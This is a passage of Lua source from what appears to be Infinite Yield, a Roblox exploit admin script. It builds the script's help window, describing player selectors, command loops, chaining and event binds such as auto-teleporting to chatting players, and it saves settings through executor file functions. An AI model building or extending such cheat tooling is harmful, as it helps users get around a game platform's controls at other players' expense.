			{50,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={48},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone with the \"bacon\" or pal hair",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{51,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{52,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={51},Size=UDim2.new(1,0,1,0),Text="age[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{53,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={51},Position=UDim2.new(0,71,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone below or at the given age",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{54,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{55,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={54},Size=UDim2.new(1,0,1,0),Text="rad[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{56,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={54},Position=UDim2.new(0,70,0,0),Size=UDim2.new(1,0,1,0),Text="- includes anyone within the given radius",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{57,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{58,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={57},Size=UDim2.new(1,0,1,0),Text="nearest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{59,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={57},Position=UDim2.new(0,43,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the closest player to you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{60,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{61,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={60},Size=UDim2.new(1,0,1,0),Text="farthest",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{62,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={60},Position=UDim2.new(0,46,0,0),Size=UDim2.new(1,0,1,0),Text="- gets the farthest player from you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{63,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{64,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={63},Size=UDim2.new(1,0,1,0),Text="group[ID]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{65,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={63},Position=UDim2.new(0,55,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are in a certain group",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{66,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{67,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={66},Size=UDim2.new(1,0,1,0),Text="alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{68,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={66},Position=UDim2.new(0,27,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are alive",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{69,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
			{70,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={69},Size=UDim2.new(1,0,1,0),Text="dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{71,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={69},Position=UDim2.new(0,29,0,0),Size=UDim2.new(1,0,1,0),Text="- gets players who are dead",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{72,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,180),ZIndex=10,}},
			{73,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={72},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Various Operators",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{74,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={72},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{75,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,16),Text="Use commas to separate multiple expressions:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{76,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,75),Size=UDim2.new(1,-8,0,16),Text="Use - to exclude, and + to include players in your expression:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{77,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,91),Size=UDim2.new(1,-8,0,16),Text=";locate %blue-friends (gets players in blue team who aren't your friends)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{78,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,46),Size=UDim2.new(1,-8,0,16),Text=";locate noob,noob2,bob",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{79,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={72},Position=UDim2.new(0,8,0,120),Size=UDim2.new(1,-8,0,16),Text="Put ! before a command to run it with the last arguments it was ran with:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{80,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={72},Position=UDim2.new(0,8,0,136),Size=UDim2.new(1,-8,0,32),Text="After running ;offset 0 100 0,  you can run !offset anytime to repeat that command with the same arguments that were used to run it last time",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{81,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,154),ZIndex=10,}},
			{82,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={81},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Command Looping",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{83,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={81},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="Form: [How many times it loops]^[delay (optional)]^[command]",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{84,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={81},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{85,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={81},Position=UDim2.new(0,8,0,50),Size=UDim2.new(1,-8,0,20),Text="Use the 'breakloops' command to stop all running loops.",TextColor3=Color3.new(1,1,1),TextSize=15,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{86,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={81},Position=UDim2.new(0,8,0,80),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{87,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={81},Position=UDim2.new(0,8,0,98),Size=UDim2.new(1,-8,0,42),Text=";5^btools - gives you 5 sets of btools\n;10^3^drophats - drops your hats every 3 seconds 10 times\n;inf^0.1^animspeed 100 - infinitely loops your animation speed to 100",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{88,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,120),ZIndex=10,}},
			{89,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={88},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Execute Multiple Commands at Once",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{90,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={88},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,20),Text="You can execute multiple commands at once using \"\\\"",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{91,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={88},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{92,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={88},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,-8,0,16),Text="Examples:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{93,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={88},Position=UDim2.new(0,8,0,78),Size=UDim2.new(1,-8,0,32),Text=";drophats\\respawn - drops your hats and respawns you\n;enable inventory\\enable playerlist\\refresh - enables those coregui items and refreshes you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{94,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
			{95,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={94},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Browse Command History",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{96,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={94},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the up and down arrow keys to browse recently used commands",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{97,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={94},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{98,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,75),ZIndex=10,}},
			{99,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={98},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Autocomplete in the Command Bar",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{100,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={98},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="While focused on the command bar, you can use the tab key to insert the top suggested command into the command bar.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{101,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={98},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{102,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,175),ZIndex=10,}},
			{103,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={102},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Using Event Binds",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{104,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="Use event binds to set up commands that get executed when certain events happen. You can edit the conditions for an event command to run (such as which player triggers it).",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{105,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={102},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
			{106,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,70),Size=UDim2.new(1,-8,0,48),Text="Some events may send arguments; you can use them in your event command by using $ followed by the argument number ($1, $2, etc). You can find out the order and types of these arguments by looking at the settings of the event command.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{107,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Text",Parent={102},Position=UDim2.new(0,8,0,130),Size=UDim2.new(1,-8,0,16),Text="Example:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{108,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={102},Position=UDim2.new(0,8,0,148),Size=UDim2.new(1,-8,0,16),Text="Setting up 'goto $1' on the OnChatted event will teleport you to any player that chats.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,TextYAlignment=0,ZIndex=10,}},
			{109,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,105),ZIndex=10,}},
			{110,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={109},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Get Further Help",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
			{111,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={109},Position=UDim2.new(0,8,0,30),Size=UDim2.new(1,-8,0,32),Text="You can join the Discord server to get support with IY,  and read up on more documentation such as the Plugin API.",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
			{112,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={109},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),Visible=false,ZIndex=10,}},
			{113,"TextButton",{BackgroundColor3=Color3.new(0.48627451062202,0.61960786581039,0.85098040103912),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Font=4,Name="InviteButton",Parent={109},Position=UDim2.new(0,5,0,75),Size=UDim2.new(1,-10,0,25),Text="Copy Discord Invite Link (https://discord.io/infiniteyield)",TextColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),TextSize=16,ZIndex=10,}},
		})
		for i,v in pairs(main.Content.List:GetDescendants()) do
			if v:IsA("TextLabel") then
				table.insert(text1,v)
			end
		end
		table.insert(scroll,main.Content.List)
		table.insert(shade1,main.Content)
		table.insert(shade2,main.TopBar)
		main.Name = randomString()
		main.TopBar.Close.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-250,0,-500), "InOut", "Quart", 0.5, true, nil)
		end)
		local inviteButton = main:FindFirstChild("InviteButton",true)
		local lastPress = nil
		inviteButton.MouseButton1Click:Connect(function()
			local func = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)
			if func then
				func("https://discord.io/infiniteyield")
				inviteButton.Text = "Copied"
			else
				inviteButton.Text = "No Clipboard Function, type out the link"
			end
			local pressTime = tick()
			lastPress = pressTime
			wait(2)
			if lastPress ~= pressTime then return end
			inviteButton.Text = "Copy Discord Invite Link (https://discord.io/infiniteyield)"
		end)
		dragGUI(main)
		main.Parent = PARENT

		ReferenceButton.MouseButton1Click:Connect(function()
			main:TweenPosition(UDim2.new(0.5,-250,0.5,-150), "InOut", "Quart", 0.5, true, nil)
		end)
	end)()

	currentShade1 = Color3.fromRGB(36, 36, 37)
	currentShade2 = Color3.fromRGB(46, 46, 47)
	currentShade3 = Color3.fromRGB(78, 78, 79)
	currentText1 = Color3.new(1, 1, 1)
	currentText2 = Color3.new(0, 0, 0)
	currentScroll = Color3.fromRGB(78,78,79)

	defaultsettings = {
		prefix = ';';
		StayOpen = false;
		logsEnabled = false;
		jLogsEnabled = false;
		aliases = {};
		binds = {};
		WayPoints = {};
		PluginsTable = {};
		currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
		currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
		currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
		currentText1 = {currentText1.R,currentText1.G,currentText1.B};
		currentText2 = {currentText2.R,currentText2.G,currentText2.B};
		currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
		eventBinds = eventEditor.SaveData()
	}

	defaults = game:GetService("HttpService"):JSONEncode(defaultsettings)

	nosaves = false

	local loadedEventData = nil
	function saves()
		if writefileExploit() then
			if pcall(function() readfile("IY_FE.iy") end) then
				if readfile("IY_FE.iy") ~= nil then
					local success, response = pcall(function()
						local json = game:GetService("HttpService"):JSONDecode(readfile("IY_FE.iy"))
						if json.prefix ~= nil then prefix = json.prefix else prefix = ';' end
						if json.StayOpen ~= nil then StayOpen = json.StayOpen else StayOpen = false end
						if json.logsEnabled ~= nil then logsEnabled = json.logsEnabled else logsEnabled = false end
						if json.jLogsEnabled ~= nil then jLogsEnabled = json.jLogsEnabled else jLogsEnabled = false end
						if json.aliases ~= nil then aliases = json.aliases else aliases = {} end
						if json.binds ~= nil then binds = json.binds else binds = {} end
						if json.spawnCmds ~= nil then spawnCmds = json.spawnCmds end
						if json.WayPoints ~= nil then AllWaypoints = json.WayPoints else WayPoints = {} AllWaypoints = {} end
						if json.PluginsTable ~= nil then PluginsTable = json.PluginsTable else PluginsTable = {} end
						if json.currentShade1 ~= nil then currentShade1 = Color3.new(json.currentShade1[1],json.currentShade1[2],json.currentShade1[3]) end
						if json.currentShade2 ~= nil then currentShade2 = Color3.new(json.currentShade2[1],json.currentShade2[2],json.currentShade2[3]) end
						if json.currentShade3 ~= nil then currentShade3 = Color3.new(json.currentShade3[1],json.currentShade3[2],json.currentShade3[3]) end
						if json.currentText1 ~= nil then currentText1 = Color3.new(json.currentText1[1],json.currentText1[2],json.currentText1[3]) end
						if json.currentText2 ~= nil then currentText2 = Color3.new(json.currentText2[1],json.currentText2[2],json.currentText2[3]) end
						if json.currentScroll ~= nil then currentScroll = Color3.new(json.currentScroll[1],json.currentScroll[2],json.currentScroll[3]) end
						if json.eventBinds then loadedEventData = json.eventBinds end
					end)
					if not success then
						warn("Save Json Error:", response)
						warn("Overwriting Save File")
						writefileCooldown("IY_FE.iy", defaults)
						wait()
						saves()
					end
				else
					writefileCooldown("IY_FE.iy", defaults)
					wait()
					saves()
				end
			else
				writefileCooldown("IY_FE.iy", defaults)
				wait()
				if pcall(function() readfile("IY_FE.iy") end) then
					saves()
				else
					nosaves = true
					prefix = ';'
					StayOpen = false
					logsEnabled = false
					jLogsEnabled = false
					aliases = {}
					binds = {}
					WayPoints = {}
					PluginsTable = {}

					local FileError = Instance.new("Frame")
					local background = Instance.new("Frame")
					local Directions = Instance.new("TextLabel")
					local shadow = Instance.new("Frame")
					local PopupText = Instance.new("TextLabel")
					local Exit = Instance.new("TextButton")
					local ExitImage = Instance.new("ImageLabel")

					FileError.Name = randomString()
					FileError.Parent = PARENT
					FileError.Active = true
					FileError.BackgroundTransparency = 1
					FileError.Position = UDim2.new(0.5, -180, 0, 290)
					FileError.Size = UDim2.new(0, 360, 0, 20)
					FileError.ZIndex = 10

					background.Name = "background"
					background.Parent = FileError
					background.Active = true
					background.BackgroundColor3 = Color3.fromRGB(36, 36, 37)
					background.BorderSizePixel = 0
					background.Position = UDim2.new(0, 0, 0, 20)
					background.Size = UDim2.new(0, 360, 0, 205)
					background.ZIndex = 10

					Directions.Name = "Directions"
					Directions.Parent = background
					Directions.BackgroundTransparency = 1
					Directions.BorderSizePixel = 0
					Directions.Position = UDim2.new(0, 10, 0, 10)
					Directions.Size = UDim2.new(0, 340, 0, 185)
					Directions.Font = Enum.Font.SourceSans
					Directions.TextSize = 14
					Directions.Text = "There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again."
					Directions.TextColor3 = Color3.new(1, 1, 1)
					Directions.TextWrapped = true
					Directions.TextXAlignment = Enum.TextXAlignment.Left
					Directions.TextYAlignment = Enum.TextYAlignment.Top
					Directions.ZIndex = 10

					shadow.Name = "shadow"
					shadow.Parent = FileError
					shadow.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
					shadow.BorderSizePixel = 0
					shadow.Size = UDim2.new(0, 360, 0, 20)
					shadow.ZIndex = 10

					PopupText.Name = "PopupText"
					PopupText.Parent = shadow
					PopupText.BackgroundTransparency = 1
					PopupText.Size = UDim2.new(1, 0, 0.95, 0)
					PopupText.ZIndex = 10
					PopupText.Font = Enum.Font.SourceSans
					PopupText.TextSize = 14
					PopupText.Text = "File Error"
					PopupText.TextColor3 = Color3.new(1, 1, 1)
					PopupText.TextWrapped = true

					Exit.Name = "Exit"
					Exit.Parent = shadow
					Exit.BackgroundTransparency = 1
					Exit.Position = UDim2.new(1, -20, 0, 0)
					Exit.Size = UDim2.new(0, 20, 0, 20)
					Exit.Text = ""
					Exit.ZIndex = 10

					ExitImage.Parent = Exit
					ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
					ExitImage.BackgroundTransparency = 1
					ExitImage.Position = UDim2.new(0, 5, 0, 5)
					ExitImage.Size = UDim2.new(0, 10, 0, 10)
					ExitImage.Image = "rbxassetid://5054663650"
					ExitImage.ZIndex = 10

					Exit.MouseButton1Click:Connect(function()
						FileError:Destroy()
					end)
				end
			end
		else
			prefix = ';'
			StayOpen = false
			logsEnabled = false
			jLogsEnabled = false
			aliases = {}
			binds = {}
			WayPoints = {}
			PluginsTable = {}
		end
	end

	saves()

	function updatesaves()
		if nosaves == false and writefileExploit() then
			local update = {
				prefix = prefix;
				StayOpen = StayOpen;
				logsEnabled = logsEnabled;
				jLogsEnabled = jLogsEnabled;
				aliases = aliases;
				binds = binds;
				WayPoints = AllWaypoints;
				PluginsTable = PluginsTable;
				currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
				currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
				currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
				currentText1 = {currentText1.R,currentText1.G,currentText1.B};
				currentText2 = {currentText2.R,currentText2.G,currentText2.B};
				currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
				eventBinds = eventEditor.SaveData()
			}
			writefileCooldown("IY_FE.iy", game:GetService("HttpService"):JSONEncode(update))
		end
	end

	eventEditor.SetOnEdited(updatesaves)

	pWayPoints = {}
	WayPoints = {}

	if #AllWaypoints > 0 then
		for i = 1, #AllWaypoints do
			if not AllWaypoints[i].GAME or AllWaypoints[i].GAME == game.PlaceId then
				WayPoints[#WayPoints + 1] = {NAME = AllWaypoints[i].NAME, COORD = {AllWaypoints[i].COORD[1], AllWaypoints[i].COORD[2], AllWaypoints[i].COORD[3]}, GAME = AllWaypoints[i].GAME}
			end
		end
	end

	function Time()
		local HOUR = math.floor((tick() % 86400) / 3600)
		local MINUTE = math.floor((tick() % 3600) / 60)
		local SECOND = math.floor(tick() % 60)
		local AP = HOUR > 11 and 'PM' or 'AM'
		HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
		HOUR = HOUR < 10 and '0' .. HOUR or HOUR
		MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
		SECOND = SECOND < 10 and '0' .. SECOND or SECOND
		return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
	end

	PrefixBox.Text = prefix
	local SettingsOpen = false

	if StayOpen == false then
		On.BackgroundTransparency = 1
	else
		On.BackgroundTransparency = 0
	end

	if logsEnabled then
		Toggle.Text = 'Enabled'
	else
		Toggle.Text = 'Disabled'
	end

	if jLogsEnabled then
		Toggle_2.Text = 'Enabled'
	else
		Toggle_2.Text = 'Disabled'
	end

	function maximizeHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -220), "InOut", "Quart", 0.2, true, nil)
		end
	end

	local minimizeNum = -20
	function minimizeHolder()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, minimizeNum), "InOut", "Quart", 0.5, true, nil)
		end
	end

	function cmdbarHolder()
		if StayOpen == false then
